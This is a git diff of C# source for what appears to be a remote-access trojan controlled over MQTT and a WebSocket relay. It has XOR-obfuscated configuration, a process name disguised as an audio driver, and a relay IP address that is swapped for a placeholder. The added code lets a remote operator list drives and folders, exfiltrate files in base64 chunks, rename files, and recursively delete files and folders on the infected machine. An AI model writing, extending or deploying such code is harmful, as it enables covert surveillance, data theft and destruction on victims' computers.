@@ -17,14 +17,11 @@ using System.Runtime.ExceptionServices;
 
 class Program
 {
-    // ⚠️ IMPORTANT: Change these values to your own unique identifiers before deployment
-    // These are XOR-encrypted strings. Use the D() function to decrypt them.
-    // Example: To use "my_secret_id", XOR each character with 0x55 and put the bytes here
-    
-    static byte[] sk = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // ⚠️ CHANGE THIS: Your unique Secret ID (XOR encrypted with 0x55)
-    static byte[] bk = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // ⚠️ CHANGE THIS: MQTT Broker address (e.g., "broker.hivemq.com" XOR encrypted)
-    static byte[] mk = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // ⚠️ CHANGE THIS: Mutex name (XOR encrypted)
-    static byte[] uk = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // ⚠️ CHANGE THIS: Executable name (e.g., "RtkAudio64" XOR encrypted)
+    // Placeholder values for public GitHub source. Replace with your own values before build.
+    static byte[] sk = { 12, 26, 0, 7, 10, 6, 16, 22, 7, 16, 1, 10, 28, 17, 10, 29, 16, 7, 16 }; // YOUR_SECRET_ID_HERE
+    static byte[] bk = { 12, 26, 0, 7, 10, 24, 4, 1, 1, 10, 23, 7, 26, 30, 16, 7, 10, 29, 16, 7, 16 }; // YOUR_MQTT_BROKER_HERE
+    static byte[] mk = { 12, 26, 0, 7, 10, 24, 0, 1, 16, 13, 10, 27, 20, 24, 16 }; // YOUR_MUTEX_NAME
+    static byte[] uk = { 12, 26, 0, 7, 10, 5, 7, 26, 22, 16, 6, 6, 10, 27, 20, 24, 16 }; // YOUR_PROCESS_NAME
     
     static string secretId = D(sk);
     static string machineId = Environment.MachineName + "_" + Environment.UserName;
@@ -146,6 +143,23 @@ class Program
                     return;
                 }
 
+                // [NEW] File System Trigger (/filesys) - WebSocket Relay
+                if (payload.Equals("/filesys")) {
+                    await StartWebSocketFileListener();
+                    var msgFile = new MqttApplicationMessageBuilder()
+                        .WithTopic($"{secretId}/{machineId}/res")
+                        .WithPayload("File system ready...")
+                        .Build();
+                    await mqttClient.PublishAsync(msgFile);
+                    return;
+                }
+
+                // [NEW] File System Handler
+                if (e.ApplicationMessage.Topic.EndsWith("/file/cmd")) {
+                    await HandleFileCommand(payload, mqttClient);
+                    return;
+                }
+
                 if (e.ApplicationMessage.Topic.EndsWith("/proxy/cmd")) {
                     await HandleProxyData(payload, mqttClient);
                     return;
@@ -169,6 +183,7 @@ class Program
             await mqttClient.ConnectAsync(options);
             await mqttClient.SubscribeAsync($"{secretId}/{machineId}/cmd");
             await mqttClient.SubscribeAsync($"{secretId}/{machineId}/proxy/cmd");
+            await mqttClient.SubscribeAsync($"{secretId}/{machineId}/file/cmd");
 
             // Heartbeat / Discovery
             while (true)
@@ -731,8 +746,10 @@ class Program
     private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);
 
     private static ClientWebSocket? _vncWebSocket;
+    private static ClientWebSocket? _fileWebSocket;
     private static bool _vncActive = false;
-    private static string RELAY_SERVER = "ws://51.83.6.5:20113";
+    private static bool _fileActive = false;
+    private static string RELAY_SERVER = "ws://YOUR_RELAY_HOST:20113";
 
     private static async Task StartWebSocketVnc(IMqttClient mqttClient) {
         try {
@@ -1183,4 +1200,285 @@ class Program
     public static extern IntPtr GetDC(IntPtr hWnd);
     [DllImport("user32.dll")]
     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+
+    // ═══════════════════════════════════════════════
+    //  File System Handler
+    // ═══════════════════════════════════════════════
+
+    private static async Task StartWebSocketFileListener() {
+        try {
+            if (_fileActive) return;
+            
+            _fileWebSocket = new ClientWebSocket();
+            await _fileWebSocket.ConnectAsync(new Uri(RELAY_SERVER), CancellationToken.None);
+            
+            // Send init message - use machineId so controller can find us by target_id
+            string initMsg = $"{{\"id\":\"{machineId}\",\"role\":\"target\"}}";
+            await _fileWebSocket.SendAsync(
+                Encoding.UTF8.GetBytes(initMsg),
+                WebSocketMessageType.Text,
+                true,
+                CancellationToken.None
+            );
+            
+            _fileActive = true;
+            
+            // Start listening for file commands
+            _ = Task.Run(async () => {
+                var buffer = new byte[10 * 1024 * 1024]; // 10MB buffer
+                while (_fileActive && _fileWebSocket?.State == WebSocketState.Open) {
+                    try {
+                        var result = await _fileWebSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
+                        
+                        if (result.MessageType == WebSocketMessageType.Text || result.MessageType == WebSocketMessageType.Binary) {
+                            string json = Encoding.UTF8.GetString(buffer, 0, result.Count);
+                            await HandleFileCommandWS(json);
+                        }
+                    } catch { break; }
+                }
+            });
+            
+        } catch (Exception ex) {
+            Console.WriteLine($"[!] File WebSocket Error: {ex.Message}");
+        }
+    }
+
+    static async Task HandleFileCommandWS(string json) {
+        try {
+            // Skip ACK messages from relay server
+            if (json.Contains("\"status\":\"connected\"") || json.Contains("\"status\":\"pong\"")) return;
+            
+            // Parse with JsonDocument
+            using var doc = System.Text.Json.JsonDocument.Parse(json);
+            var root = doc.RootElement;
+            
+            string cmd  = root.TryGetProperty("cmd",  out var c) ? c.GetString() ?? "" : "";
+            string path = root.TryGetProperty("path", out var p) ? p.GetString() ?? "" : "";
+            
+            if (string.IsNullOrEmpty(cmd)) return;
+            
+            string response = "";
+            
+            switch (cmd) {
+                case "LIST_DRIVES":
+                    response = GetDrivesList();
+                    break;
+                case "LIST_DIR":
+                    response = GetDirectoryListing(path);
+                    break;
+                case "DOWNLOAD":
+                    await SendFileDataWS(path);
+                    return;
+                case "DELETE":
+                    DeleteFileOrFolder(path);
+                    response = System.Text.Json.JsonSerializer.Serialize(new { status = "OK" });
+                    break;
+                case "RENAME":
+                    string[] parts = path.Split('|');
+                    if (parts.Length == 2) {
+                        File.Move(parts[0], parts[1]);
+                        response = System.Text.Json.JsonSerializer.Serialize(new { status = "OK" });
+                    }
+                    break;
+            }
+            
+            if (string.IsNullOrEmpty(response)) return;
+            
+            if (_fileWebSocket?.State == WebSocketState.Open) {
+                await _fileWebSocket.SendAsync(
+                    Encoding.UTF8.GetBytes(response),
+                    WebSocketMessageType.Text,
+                    true,
+                    CancellationToken.None
+                );
+            }
+            
+        } catch (Exception ex) {
+            string errMsg = System.Text.Json.JsonSerializer.Serialize(new { status = "ERROR", message = ex.Message });
+            if (_fileWebSocket?.State == WebSocketState.Open) {
+                await _fileWebSocket.SendAsync(
+                    Encoding.UTF8.GetBytes(errMsg),
+                    WebSocketMessageType.Text,
+                    true,
+                    CancellationToken.None
+                );
+            }
+        }
+    }
+    
+    static async Task SendFileDataWS(string path) {
+        try {
+            byte[] fileData = File.ReadAllBytes(path);
+            int chunkSize = 50000;
+            int chunks = (int)Math.Ceiling((double)fileData.Length / chunkSize);
+            
+            for (int i = 0; i < chunks; i++) {
+                int offset = i * chunkSize;
+                int length = Math.Min(chunkSize, fileData.Length - offset);
+                byte[] chunk = new byte[length];
+                Array.Copy(fileData, offset, chunk, 0, length);
+                
+                string json = System.Text.Json.JsonSerializer.Serialize(new {
+                    cmd   = "FILE_CHUNK",
+                    chunk = i,
+                    total = chunks,
+                    data  = Convert.ToBase64String(chunk)
+                });
+                
+                if (_fileWebSocket?.State == WebSocketState.Open) {
+                    await _fileWebSocket.SendAsync(
+                        Encoding.UTF8.GetBytes(json),
+                        WebSocketMessageType.Text,
+                        true,
+                        CancellationToken.None
+                    );
+                }
+                await Task.Delay(50);
+            }
+        } catch (Exception ex) {
+            string errMsg = System.Text.Json.JsonSerializer.Serialize(new { status = "ERROR", message = ex.Message });
+            if (_fileWebSocket?.State == WebSocketState.Open) {
+                await _fileWebSocket.SendAsync(
+                    Encoding.UTF8.GetBytes(errMsg),
+                    WebSocketMessageType.Text,
+                    true,
+                    CancellationToken.None
+                );
+            }
+        }
+    }
+
+    static async Task HandleFileCommand(string json, IMqttClient mqttClient) {
+        try {
+            using var doc = System.Text.Json.JsonDocument.Parse(json);
+            var root = doc.RootElement;
+            string cmd  = root.TryGetProperty("cmd",  out var c) ? c.GetString() ?? "" : "";
+            string path = root.TryGetProperty("path", out var p) ? p.GetString() ?? "" : "";
+            if (string.IsNullOrEmpty(cmd)) return;
+            
+            string response = "";
+            switch (cmd) {
+                case "LIST_DRIVES": response = GetDrivesList(); break;
+                case "LIST_DIR":    response = GetDirectoryListing(path); break;
+                case "DOWNLOAD":    await SendFileData(path, mqttClient); return;
+                case "DELETE":
+                    DeleteFileOrFolder(path);
+                    response = System.Text.Json.JsonSerializer.Serialize(new { status = "OK" });
+                    break;
+                case "RENAME":
+                    string[] parts = path.Split('|');
+                    if (parts.Length == 2) { File.Move(parts[0], parts[1]); }
+                    response = System.Text.Json.JsonSerializer.Serialize(new { status = "OK" });
+                    break;
+            }
+            
+            if (string.IsNullOrEmpty(response)) return;
+            var msg = new MqttApplicationMessageBuilder()
+                .WithTopic($"{secretId}/{machineId}/file/res")
+                .WithPayload(response).Build();
+            await mqttClient.PublishAsync(msg);
+            
+        } catch (Exception ex) {
+            string errPayload = System.Text.Json.JsonSerializer.Serialize(new { status = "ERROR", message = ex.Message });
+            var errMsg = new MqttApplicationMessageBuilder()
+                .WithTopic($"{secretId}/{machineId}/file/res")
+                .WithPayload(errPayload).Build();
+            await mqttClient.PublishAsync(errMsg);
+        }
+    }
+    
+    static string GetDrivesList() {
+        try {
+            var drives = DriveInfo.GetDrives()
+                .Where(d => d.IsReady)
+                .Select(d => d.Name)
+                .ToArray();
+            return System.Text.Json.JsonSerializer.Serialize(new { cmd = "DRIVES", drives });
+        } catch (Exception ex) {
+            return System.Text.Json.JsonSerializer.Serialize(new { status = "ERROR", message = ex.Message });
+        }
+    }
+    
+    static string GetDirectoryListing(string path) {
+        try {
+            var items = new List<object>();
+            
+            foreach (var dir in Directory.GetDirectories(path)) {
+                var di = new DirectoryInfo(dir);
+                items.Add(new {
+                    name     = di.Name,
+                    type     = "DIR",
+                    size     = "-",
+                    modified = di.LastWriteTime.ToString("yyyy-MM-dd HH:mm")
+                });
+            }
+            
+            foreach (var file in Directory.GetFiles(path)) {
+                var fi = new FileInfo(file);
+                items.Add(new {
+                    name     = fi.Name,
+                    type     = "FILE",
+                    size     = FormatFileSize(fi.Length),
+                    modified = fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm")
+                });
+            }
+            
+            return System.Text.Json.JsonSerializer.Serialize(new { cmd = "DIR", items });
+        } catch (Exception ex) {
+            return System.Text.Json.JsonSerializer.Serialize(new { status = "ERROR", message = ex.Message });
+        }
+    }
+    
+    static string FormatFileSize(long bytes) {
+        string[] sizes = { "B", "KB", "MB", "GB", "TB" };
+        double len = bytes;
+        int order = 0;
+        while (len >= 1024 && order < sizes.Length - 1) {
+            order++;
+            len = len / 1024;
+        }
+        return $"{len:0.##} {sizes[order]}";
+    }
+    
+    static async Task SendFileData(string path, IMqttClient mqttClient) {
+        try {
+            byte[] fileData = File.ReadAllBytes(path);
+            
+            // Send file data via MQTT (chunked if large)
+            int chunkSize = 50000; // 50KB chunks
+            int chunks = (int)Math.Ceiling((double)fileData.Length / chunkSize);
+            
+            for (int i = 0; i < chunks; i++) {
+                int offset = i * chunkSize;
+                int length = Math.Min(chunkSize, fileData.Length - offset);
+                byte[] chunk = new byte[length];
+                Array.Copy(fileData, offset, chunk, 0, length);
+                
+                string base64 = Convert.ToBase64String(chunk);
+                string json = $"{{\"cmd\":\"FILE_CHUNK\",\"chunk\":{i},\"total\":{chunks},\"data\":\"{base64}\"}}";
+                
+                var msg = new MqttApplicationMessageBuilder()
+                    .WithTopic($"{secretId}/{machineId}/file/res")
+                    .WithPayload(json)
+                    .Build();
+                await mqttClient.PublishAsync(msg);
+                
+                await Task.Delay(100); // Throttle
+            }
+        } catch (Exception ex) {
+            var errMsg = new MqttApplicationMessageBuilder()
+                .WithTopic($"{secretId}/{machineId}/file/res")
+                .WithPayload($"{{\"status\":\"ERROR\",\"message\":\"{ex.Message}\"}}")
+                .Build();
+            await mqttClient.PublishAsync(errMsg);
+        }
+    }
+    
+    static void DeleteFileOrFolder(string path) {
+        if (File.Exists(path)) {
+            File.Delete(path);
+        } else if (Directory.Exists(path)) {
+            Directory.Delete(path, true);
+        }
+    }
 }
